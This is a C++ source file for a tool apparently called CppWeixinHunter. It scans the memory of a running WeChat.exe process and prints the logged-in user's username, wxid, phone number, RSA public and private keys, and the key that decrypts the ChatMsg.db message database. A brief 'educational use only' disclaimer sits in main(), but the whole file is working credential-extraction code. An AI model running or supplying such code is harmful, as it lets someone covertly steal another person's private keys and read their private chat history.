#include "utils.h"
//#include <iostream>
#include "aobscan.h"

void PrintfHex(BYTE* buff, DWORD length) {
	for (size_t i = 0; i < length; i++){
		printf("0x%x ",*(buff + i));
	}
	printf("\n");
}

void PrintfCFormat(char* name, BYTE* buff, DWORD length) {
	printf("unsigned char %s[] = {",name);
	for (size_t i = 0; i < length; i++) {
		printf("0x%x, ", *(buff + i));
	}
	printf("};\n");
}

BOOL ParseWeixin(DWORD PID, BYTE* sig) {
	DWORD pBase = 0;
	DWORD dwSize = 0;
	char* szProcName = "wechatwin.dll";
	FindModule(PID, szProcName, &pBase, &dwSize);

	DWORD pAddr = SUNDAY(PID, (unsigned char*)pBase, (unsigned char*)sig, /*sizeof(sig)*/ sizeof(DWORD), dwSize);
	if (pAddr == 0){
		//printf("未搜索到特征值\n");
		return FALSE;
	}

	printf("wechatwin.dll基址为:0x%x\n\n", pBase);
	//printf("pAddr:0x%x\n", pAddr);

	int usernameLength = 0;
	//int intUsernameLength = 0;
	ReadProcessMem(PID, (PVOID)(pAddr - 0x5c), &usernameLength, sizeof(int));
	//printf("usernameLength:%d\n", usernameLength);


	BYTE* username = new BYTE[usernameLength + 1];
	ReadProcessMem(PID, (PVOID)(pAddr - 0x6c), username, usernameLength);
	username[usernameLength] = 0x00;
	printf("username:%s\n\n", username);

	int wxidLength = 0;
	ReadProcessMem(PID, (PVOID)(pAddr - 0x44), &wxidLength, sizeof(int));
	//printf("wxidLength:%d\n", wxidLength);

	//BYTE* wxidAddress = new BYTE[sizeof(int)];
	int wxidAddress = 0;
	ReadProcessMem(PID, (PVOID)(pAddr - 0x54), &wxidAddress, sizeof(int));
	//printf("wxidAddress:0x%x\n", wxidAddress);

	BYTE* wxid = new BYTE[wxidLength + 1];
	ReadProcessMem(PID, (PVOID)wxidAddress, wxid, wxidLength);
	wxid[wxidLength] = 0x00;
	printf("wxid:%s\n\n", wxid);
	delete[] wxid;

	int mobilePhoneModelLength = 0;
	ReadProcessMem(PID, (PVOID)(pAddr - 0xC), &mobilePhoneModelLength, sizeof(int));
	//printf("mobilePhoneModelLength:%d\n", mobilePhoneModelLength);

	BYTE* mobileModel = new BYTE[mobilePhoneModelLength + 1];
	ReadProcessMem(PID, (PVOID)wxidAddress, mobileModel, mobilePhoneModelLength);
	mobileModel[mobilePhoneModelLength] = 0x00;
	//printf("mobileModel:%s\n", mobileModel);
	delete[] mobileModel;

	int phoneNumberLength = 0;
	ReadProcessMem(PID, (PVOID)(pAddr - 0x47c), &phoneNumberLength, sizeof(int));
	//printf("phoneNumberLength:%d\n", phoneNumberLength);

	BYTE* phoneNumber = new BYTE[phoneNumberLength + 1];
	ReadProcessMem(PID, (PVOID)(pAddr - 0x48c), phoneNumber, phoneNumberLength);
	phoneNumber[phoneNumberLength] = 0x00;
	printf("phoneNumber:%s\n\n", phoneNumber);
	delete[] phoneNumber;

	int publicKeyLength = 0;
	ReadProcessMem(PID, (PVOID)(pAddr + 0x10), &publicKeyLength, sizeof(int));

	int publicKeyAddress = 0;
	ReadProcessMem(PID, (PVOID)(pAddr), &publicKeyAddress, sizeof(int));

	BYTE* publicKey = new BYTE[publicKeyLength + 1];
	ReadProcessMem(PID, (PVOID)publicKeyAddress, publicKey, publicKeyLength);
	publicKey[publicKeyLength] = 0x00;
	printf("publicKey:\n%s\n\n", publicKey);
	delete[] publicKey;

	int privateKeyLength = 0;
	ReadProcessMem(PID, (PVOID)(pAddr + 0x28), &privateKeyLength, sizeof(int));

	int privateKeyAddress = 0;
	ReadProcessMem(PID, (PVOID)(pAddr + 0x18), &privateKeyAddress, sizeof(int));

	BYTE* privateKey = new BYTE[privateKeyLength + 1];
	ReadProcessMem(PID, (PVOID)privateKeyAddress, privateKey, privateKeyLength);
	privateKey[privateKeyLength] = 0x00;
	printf("privateKey:\n%s\n\n", privateKey);
	delete[] privateKey;

	int sqliteKeyLength = 0;
	ReadProcessMem(PID, (PVOID)(pAddr - 0x8c), &sqliteKeyLength, sizeof(int));
	//printf("sqliteKeyLength:%d\n", sqliteKeyLength);

	int sqliteKeyAddress = 0;
	ReadProcessMem(PID, (PVOID)(pAddr - 0x90), &sqliteKeyAddress, sizeof(int));
	//printf("sqliteKeyAddress:0x%x\n", sqliteKeyAddress);

	BYTE* sqliteKey = new BYTE[sqliteKeyLength];
	ReadProcessMem(PID, (PVOID)sqliteKeyAddress, sqliteKey, sqliteKeyLength);
	//printf("sqliteKey:%s\n", sqliteKey);
	printf("解密ChatMsg.db的C语言格式密码:\n");
	PrintfCFormat("pass", sqliteKey, sqliteKeyLength);
	delete[] sqliteKey;

	return TRUE;
}

int main() {
	DWORD PID = GetProcessID("WeChat.exe");
	char* sig = "2D2D2D2D2D424547494E205055424C4943204B45592D2D2D2D2D0A";

	printf("github:https://github.com/baiyies/CppWeixinHunter \n");
	printf("仅限用于教育目的，使用本工具的过程中存在任何非法行为，需自行承担相应后果，作者不承担任何法律及连带责任。\n\n");
	printf(R"delimiter(


 __       __            __            __            __    __                        __                         
/  |  _  /  |          /  |          /  |          /  |  /  |                      /  |                        
$$ | / \ $$ |  ______  $$/  __    __ $$/  _______  $$ |  $$ | __    __  _______   _$$ |_     ______    ______  
$$ |/$  \$$ | /      \ /  |/  \  /  |/  |/       \ $$ |__$$ |/  |  /  |/       \ / $$   |   /      \  /      \ 
$$ /$$$  $$ |/$$$$$$  |$$ |$$  \/$$/ $$ |$$$$$$$  |$$    $$ |$$ |  $$ |$$$$$$$  |$$$$$$/   /$$$$$$  |/$$$$$$  |
$$ $$/$$ $$ |$$    $$ |$$ | $$  $$<  $$ |$$ |  $$ |$$$$$$$$ |$$ |  $$ |$$ |  $$ |  $$ | __ $$    $$ |$$ |  $$/ 
$$$$/  $$$$ |$$$$$$$$/ $$ | /$$$$  \ $$ |$$ |  $$ |$$ |  $$ |$$ \__$$ |$$ |  $$ |  $$ |/  |$$$$$$$$/ $$ |      
$$$/    $$$ |$$       |$$ |/$$/ $$  |$$ |$$ |  $$ |$$ |  $$ |$$    $$/ $$ |  $$ |  $$  $$/ $$       |$$ |      
$$/      $$/  $$$$$$$/ $$/ $$/   $$/ $$/ $$/   $$/ $$/   $$/  $$$$$$/  $$/   $$/    $$$$/   $$$$$$$/ $$/       
                                                                                                               
                                                                                                               
                                                                                                               

)delimiter");
	if (PID == 0) {
		printf("未能找到WeChat.exe进程!搜索失败!\n");
		return -1;
	}



	BOOL isSuccess = FALSE;

	std::vector <DWORD> vResultContainer = AobScan::FindSigX32(PID, sig, 0, 0x7fffffff);
	int nSize1 = 0;

	//for (auto it = vResultContainer.begin(); it != vResultContainer.end(); it++) {
	//	printf("0x%x\n", *it);
	//}

	for (auto it = vResultContainer.begin(); it != vResultContainer.end(); it++)
	{
		BYTE* buf = new BYTE[sizeof(DWORD)];
		memcpy(buf, &(*it), sizeof(DWORD));
		//PrintfHex(buf, sizeof(DWORD));

		if (ParseWeixin(PID, buf)) {
			isSuccess = TRUE;
			break;
		}
	}

	if (isSuccess){
		printf("\n搜索成功!\n");
		return 0;
	}
	else{
		printf("\n搜索失败!只有登录后才能正确搜索!\n");
		return 1;
	}
}